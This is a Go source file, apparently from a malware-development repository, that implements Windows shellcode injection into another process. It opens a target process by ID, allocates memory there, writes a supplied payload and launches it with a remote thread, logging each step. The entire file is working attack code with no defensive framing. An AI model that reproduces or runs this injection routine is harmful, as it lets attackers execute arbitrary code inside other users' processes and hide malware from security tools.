package process_injection

import (
	"fmt"
	"github.com/osonkr/malware-development/win32"
	"log"
	"syscall"
	"unsafe"
)

// Inject will attempt to inject a byte array into a new region of memory
// in the process provided. It will the create a remote thread at the given base address
// of the new memory region.
func Inject(data []byte, pid uint32) {
	buf := append(data, byte(0))
	size := len(buf)

	// 1. Get Remote Process Handle
	var rights uint32 = win32.PROCESS_CREATE_THREAD |
		win32.PROCESS_QUERY_INFORMATION |
		win32.PROCESS_VM_OPERATION |
		win32.PROCESS_VM_WRITE |
		win32.PROCESS_VM_WRITE

	procHandle, err := win32.OpenProcess(rights, 0, pid)
	if err != nil {
		log.Fatalf("couldn't open process: %s", err)
	}

	fmt.Printf("[*] Created remote process handle %v\n", unsafe.Pointer(procHandle))

	// 2. Create New Region of Memory in Remote Process
	var null win32.NULL_REF
	baseAddr, err := win32.VirtualAllocEx(
		procHandle,
		uintptr(null),
		uintptr(size),
		win32.MEM_COMMIT | win32.MEM_RESERVE,
		win32.PAGE_EXECUTE_READ,
		)

	if err != nil {
		log.Fatalf("unable to allocate memory to process: %s", err)
	}

	fmt.Printf("[*] Allocated %d bytes to memory address: %v\n", size, unsafe.Pointer(baseAddr))

	// 3. Write to Memory
	var bWritten *byte

	if err = win32.WriteProcessMemory(
		procHandle,
		baseAddr,
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(bWritten)),
		); err != nil {
		log.Fatalf("unable to write to memory: %s", err)
	}

	fmt.Printf("[*] Wrote shellcode to memory\n")

	// 4. Create Remote Thread at baseAddr
	var threadAttrs win32.LPSECURITY_ATTRIBUTES
	remoteThread, err := win32.CreateRemoteThread(
		procHandle,
		threadAttrs,
		0,
		baseAddr,
		0,
		0,
		0,
		)

	if err != nil {
		log.Fatalf("unable to create remote thread: %s\n", err)
	}

	fmt.Printf("[*] Remote thread created: %v\n", unsafe.Pointer(remoteThread))

	// 5. Verify Injection with WaitForSingleObject
	_, err = win32.WaitForSingleObject(remoteThread, syscall.INFINITE)
	if err != nil {
		log.Fatalf("unable to get thread wait state: %s\n", err)
	}

	// 6. Check exit code from thread
	exitCode, err := win32.GetExitCodeThread(remoteThread)
	if err != nil {
		log.Fatalf("was not able to get exit code from thread: %s\n", err)
	}

	if exitCode != 0 {
		log.Fatalf("thread closed with exit code: %d\n", exitCode)
	}

	// 7. Close handle to remote thread
	if err = win32.CloseHandle(remoteThread); err != nil {
		log.Fatalf("unable to close remote thread handle: %s\n", err)
	}

	// 8. Free up used memory
	if err = win32.VirtualFreeEx(procHandle, baseAddr, uintptr(size), win32.MEM_RELEASE); err != nil {
		log.Fatalf("was not able to free up memory after thread usage: %s\n", err)
	}
}
